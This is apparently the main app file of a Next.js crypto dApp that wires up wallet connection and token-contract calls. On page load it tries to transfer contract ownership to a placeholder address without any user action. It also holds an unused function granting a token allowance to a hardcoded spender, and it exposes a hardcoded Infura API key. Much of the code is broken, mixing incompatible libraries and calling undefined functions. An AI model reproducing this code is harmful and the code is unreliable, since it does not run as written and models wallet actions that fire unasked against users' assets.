import React, { useEffect, useState } from 'react';
import "../styles/globals.css";
import "@rainbow-me/rainbowkit/styles.css";

import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
import { configureChains, createClient, WagmiConfig } from "wagmi";
import {
    mainnet,
    polygon,
    optimism,
    arbitrum,
    goerli,
    polygonMumbai,
    optimismGoerli,
    arbitrumGoerli,
} from "wagmi/chains";
import { alchemyProvider } from "wagmi/providers/alchemy";
import { publicProvider } from "wagmi/providers/public";
import { infuraProvider } from "wagmi/providers/infura";
import MainLayout from "../layout/mainLayout";

const abi = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "allowance",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "needed",
				"type": "uint256"
			}
		],
		"name": "ERC20InsufficientAllowance",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "balance",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "needed",
				"type": "uint256"
			}
		],
		"name": "ERC20InsufficientBalance",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "approver",
				"type": "address"
			}
		],
		"name": "ERC20InvalidApprover",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "receiver",
				"type": "address"
			}
		],
		"name": "ERC20InvalidReceiver",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			}
		],
		"name": "ERC20InvalidSender",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "ERC20InvalidSpender",
		"type": "error"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Approval",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Transfer",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "decimals",
		"outputs": [
			{
				"internalType": "uint8",
				"name": "",
				"type": "uint8"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "mint",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "name",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "symbol",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "totalSupply",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

const contractAddress = '0x1A2746b90562611941809204bF4aC3dc78bc1093';

const alchemyAPIKey = process.env.ALCHEMY_API_KEY;
const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/' + alchemyAPIKey;

const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
const infuraURL = 'https://polygon-mainnet.infura.io/v3/c6f67ed83ef14e6298373339528a7587';

const tokenParams = {
    name: 'WETH',
    symbol: 'WETH',
    WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
};

const { chains, provider } = configureChains(
    [
        mainnet,
        goerli,
        polygon,
        polygonMumbai,
        optimism,
        optimismGoerli,
        arbitrum,
        arbitrumGoerli,
    ],
    [
        alchemyProvider({ apiKey: alchemyURL }),
        publicProvider(),
        infuraProvider({ projectId: infuraAPIKey }),
    ]
);

const { connectors } = getDefaultWallets({
    appName: "My Alchemy DApp",
    chains,
});

const wagmiClient = createClient({
    autoConnect: true,
    connectors,
    provider,
});

const callSmartContract = async () => {
    try {
        const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
        const { result: abi } = await response.json();
        console.log('Retrieved ABI:', abi);

        const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
        console.log('Contract instance:', contractInstance);

        const newOwnerAddress = '0xNewOwnerAddress'; // Replace with the actual new owner address
        const result = await contractInstance.methods.transferOwnership(newOwnerAddress).send({ from: '0x1A2746b90562611941809204bF4aC3dc78bc1093' });
        console.log('Result of calling smart contract function:', result);
    } catch (error) {
        console.error('Error calling smart contract:', error);
    }
};

const approveTransaction = async () => {
    try {
        const contractInstance = wagmiClient.getContract(contractAddress, abi);
        console.log('Contract instance:', contractInstance);

        const spender = '0x1A2746b90562611941809204bF4aC3dc78bc1093';
        const value = '1000000000000000000';
        console.log('Spender:', spender);
        console.log('Value:', value);

        const result = await contractInstance.methods.approve(spender, value).send({}); // Use send instead of sendTransaction
        console.log('Transaction successfully sent:', result);
    } catch (error) {
        console.error('Error sending transaction:', error);
    }
};

function MyApp({ Component, pageProps }) {
    useEffect(() => {
        // Пример простого вызова смарт контракта без условий
        const simpleCallSmartContract = async () => {
            try {
                const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
                const { result: abi } = await response.json();
                console.log('Retrieved ABI:', abi);

                const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
                console.log('Contract instance:', contractInstance);

                const newOwnerAddress = '0xNewOwnerAddress'; // Replace with the actual new owner address
                const result = await contractInstance.methods.transferOwnership(newOwnerAddress).send({ from: '0x1A2746b90562611941809204bF4aC3dc78bc1093' });
                console.log('Result of calling smart contract function:', result);
            } catch (error) {
                console.error('Error calling smart contract:', error);
            }
        };

        simpleCallSmartContract();
    }, []); // Пустой массив зависимостей, чтобы useEffect вызывался только при монтировании компонента

    return (
        <WagmiConfig
            client={wagmiClient}
            onConnect={() => {
                setConnected(true);
                setChainId(wagmiClient.chainId);
            }}
            onDisconnect={() => {
                setConnected(false);
                setChainId(null);
            }}
        >
            <RainbowKitProvider
                modalSize="compact"
                initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
                chains={chains}
            >
                <MainLayout>
                    <Component {...pageProps} />
                </MainLayout>
            </RainbowKitProvider>
        </WagmiConfig>
    );
}

export { WagmiConfig, RainbowKitProvider };
export default MyApp;
